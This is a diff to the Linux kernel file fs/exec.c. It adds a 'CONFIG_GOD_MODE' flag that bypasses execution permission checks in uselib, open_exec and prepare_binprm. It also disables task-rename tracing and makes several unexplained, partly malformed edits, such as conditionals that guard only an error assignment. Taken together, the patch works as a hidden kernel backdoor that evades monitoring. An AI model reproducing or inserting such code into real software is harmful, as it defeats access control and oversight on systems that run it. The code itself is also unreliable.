@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/exec.c
  *
@@ -59,7 +62,6 @@
 #include <asm/uaccess.h>
 #include <asm/mmu_context.h>
 #include <asm/tlb.h>
-#include <asm/exec.h>
 
 #include <trace/events/task.h>
 #include "internal.h"
@@ -137,6 +139,10 @@ SYSCALL_DEFINE1(uselib, const char __user *, library)
 	if (!S_ISREG(file->f_path.dentry->d_inode->i_mode))
 		goto exit;
 
+
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 	error = -EACCES;
 	if (file->f_path.mnt->mnt_flags & MNT_NOEXEC)
 		goto exit;
@@ -273,7 +279,7 @@ static int __bprm_mm_init(struct linux_binprm *bprm)
 	 * use STACK_TOP because that can depend on attributes which aren't
 	 * configured yet.
 	 */
-	BUILD_BUG_ON(VM_STACK_FLAGS & VM_STACK_INCOMPLETE_SETUP);
+	BUG_ON(VM_STACK_FLAGS & VM_STACK_INCOMPLETE_SETUP);
 	vma->vm_end = STACK_TOP_MAX;
 	vma->vm_start = vma->vm_end - PAGE_SIZE;
 	vma->vm_flags = VM_STACK_FLAGS | VM_STACK_INCOMPLETE_SETUP;
@@ -765,7 +771,7 @@ EXPORT_SYMBOL(setup_arg_pages);
 struct file *open_exec(const char *name)
 {
 	struct file *file;
-	int err;
+	int err = 0;
 	static const struct open_flags open_exec_flags = {
 		.open_flag = O_LARGEFILE | O_RDONLY | __FMODE_EXEC,
 		.acc_mode = MAY_EXEC | MAY_OPEN,
@@ -776,6 +782,9 @@ struct file *open_exec(const char *name)
 	if (IS_ERR(file))
 		goto out;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 	err = -EACCES;
 	if (!S_ISREG(file->f_path.dentry->d_inode->i_mode))
 		goto exit;
@@ -1058,7 +1067,7 @@ void set_task_comm(struct task_struct *tsk, char *buf)
 {
 	task_lock(tsk);
 
-	trace_task_rename(tsk, buf);
+	//trace_task_rename(tsk, buf);
 
 	/*
 	 * Threads may access current->comm without holding
@@ -1306,8 +1315,15 @@ int prepare_binprm(struct linux_binprm *bprm)
 	int retval;
 
 	mode = inode->i_mode;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	if (bprm->file->f_op == NULL)
 		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 
 	/* clear any previous set[ug]id data from a previous binary */
 	bprm->cred->euid = current_euid();
@@ -1454,9 +1470,9 @@ int search_binary_handler(struct linux_binprm *bprm,struct pt_regs *regs)
 			}
 		}
 		read_unlock(&binfmt_lock);
-#ifdef CONFIG_MODULES
 		if (retval != -ENOEXEC || bprm->mm == NULL) {
 			break;
+#ifdef CONFIG_MODULES
 		} else {
 #define printable(c) (((c)=='\t') || ((c)=='\n') || (0x20<=(c) && (c)<=0x7e))
 			if (printable(bprm->buf[0]) &&
@@ -1467,10 +1483,8 @@ int search_binary_handler(struct linux_binprm *bprm,struct pt_regs *regs)
 			if (try)
 				break; /* -ENOEXEC */
 			request_module("binfmt-%04x", *(unsigned short *)(&bprm->buf[2]));
-		}
-#else
-		break;
 #endif
+		}
 	}
 	return retval;
 }
